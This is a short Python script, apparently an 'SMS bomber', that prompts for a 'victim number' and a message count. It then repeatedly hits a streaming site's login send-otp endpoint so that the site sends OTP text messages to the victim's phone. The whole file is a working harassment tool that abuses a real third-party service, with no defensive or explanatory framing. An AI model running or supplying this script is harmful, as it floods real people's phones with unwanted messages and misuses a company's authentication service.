import os
import time
from urllib import request
phone=input("Enter Your Victim Number :")
sms=int(input("Victim Attack SMS Ammount :" ))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "STF..... Sms Bombing SMS Sent ")
	time.sleep(30)